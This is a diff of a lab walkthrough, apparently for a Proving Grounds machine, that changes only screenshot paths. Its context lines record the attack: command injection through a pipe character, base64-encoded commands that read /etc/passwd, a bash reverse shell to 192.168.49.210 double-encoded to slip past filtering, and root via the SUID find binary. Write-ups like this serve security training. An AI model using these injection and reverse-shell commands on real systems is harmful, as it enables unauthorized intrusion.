@@ -40,12 +40,12 @@ PORT   STATE SERVICE
 
 - Checking burp request 
 
-![](2022-07-27-15-42-17.png)
+![](\assets\images\noname-pg\2022-07-27-15-42-17.png)
 
 - Trying command injection with `sleep` command.
     - `;` `&` did not work but `|` worked
 
-![](2022-07-27-15-43-36.png)
+![](\assets\images\noname-pg\2022-07-27-15-43-36.png)
 
 - As we can see from the bottom of the screenshot we were able to successfully inject the `sleep` command for five seconds.
 
@@ -82,20 +82,20 @@ echo "<pre>$outer</pre>";
 - tried echoing a base64 encoded command then pipe to `base64 -d` then to `bash`
     - `echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash`
 
-![](2022-07-27-16-26-33.png)
+![](\assets\images\noname-pg\2022-07-27-16-26-33.png)
 
 - and it worked.
 
 - tried with a reverse shell `bash -i >& /dev/tcp/192.168.49.210/80 0>&1`
     - `|echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjIxMC84MCAwPiYx' | base64 -d | bash` did not work for some reason, when `bash` is removed at the end it gives me the following result
            
-        ![](2022-07-27-16-48-44.png)
+        ![](\assets\images\noname-pg\2022-07-27-16-48-44.png)
 
         - looks like it is not printing the whole base64 encoded command.
 
     - tried double `base64` encoding and it worked `|echo+'WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE9USXVNVFk0TGpRNUxqSXhNQzg0TUNBd1BpWXg='|base64+-d|base64+-d|bash`
 
-        ![](2022-07-27-16-46-09.png)
+        ![](\assets\images\noname-pg\2022-07-27-16-46-09.png)
 
 ## Privesc
 
@@ -103,11 +103,11 @@ echo "<pre>$outer</pre>";
 - we are `www-data` 
 - checking `SUIDs` I noticed `/usr/bin/find` not sure if it is normal but I checked in [GTFObins](https://gtfobins.github.io/gtfobins/find/#suid) and looks like we can privesc using this command.
 
-![](2022-07-27-16-52-16.png)
+![](\assets\images\noname-pg\2022-07-27-16-52-16.png)
 
 - `find . -exec /bin/sh \; -quit`
 
 - and we are root.
 
-![](2022-07-27-16-54-22.png)
+![](\assets\images\noname-pg\2022-07-27-16-54-22.png)
 
